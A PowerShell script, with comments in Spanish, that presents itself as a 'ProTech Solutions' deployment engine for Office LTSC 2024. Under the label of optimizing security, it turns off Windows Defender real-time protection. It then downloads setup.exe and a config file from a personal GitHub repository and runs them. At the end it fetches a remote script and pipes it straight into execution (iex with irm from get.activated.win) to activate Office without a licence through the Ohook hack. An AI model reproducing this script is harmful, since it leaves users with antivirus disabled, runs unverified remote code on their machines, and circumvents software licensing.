# --- Motor de Despliegue ProTech Solutions v5.0 ---
# Ajustes: Telemetría visual, Auto-Defender y Bypass de CDN

# 1. Elevación y Auto-Desactivación de Defender
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "[X] Error: Ejecuta PowerShell como Administrador."
    return
}
Write-Host "-> Optimizando seguridad del sistema para el despliegue..." -ForegroundColor Cyan
Set-MpPreference -DisableRealtimeMonitoring $true

# 2. Configuración de Rutas
$RepoUrl = "https://raw.githubusercontent.com/juanpabloante/juanpabloante.github.io/main"
$TempDir = "C:\ProTechDeploy"

if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force }
New-Item -Path $TempDir -ItemType Directory | Out-Null
Set-Location $TempDir

# 3. Descarga de Componentes
Write-Host "-> Obteniendo motor y configuracion desde repositorio privado..." -ForegroundColor Cyan
Invoke-WebRequest -Uri "$RepoUrl/setup.exe" -OutFile "setup.exe" -UseBasicParsing
Invoke-WebRequest -Uri "$RepoUrl/config2024.xml" -OutFile "config.xml" -UseBasicParsing

# 4. Validación de Integridad
if ((Get-Item "setup.exe").Length -lt 1000000) {
    Write-Host "[X] ERROR CRITICO: El motor no se descargo correctamente." -ForegroundColor Red
    return
}

# 5. Instalación con Barra de Progreso Visual
Write-Host "-> Iniciando instalacion de Office LTSC 2024..." -ForegroundColor Yellow
Write-Host "Podras ver el progreso en la ventana emergente de Office." -ForegroundColor White

# Eliminamos el modo "None" interno del XML y forzamos visualizacion mediante el comando
$process = Start-Process -FilePath ".\setup.exe" -ArgumentList "/configure config.xml" -Wait -PassThru

# 6. Activación Final
if ($process.ExitCode -eq 0) {
    Write-Host "-> Instalacion exitosa. Iniciando activacion (Ohook)..." -ForegroundColor Green
    iex "& { $(irm https://get.activated.win) } /ohook"
    Write-Host "¡DESPLIEGUE FINALIZADO EXITOSAMENTE!" -ForegroundColor Green
} else {
    Write-Host "[X] El proceso se detuvo con codigo: $($process.ExitCode)" -ForegroundColor Red
}

Read-Host "Presiona Enter para finalizar..."
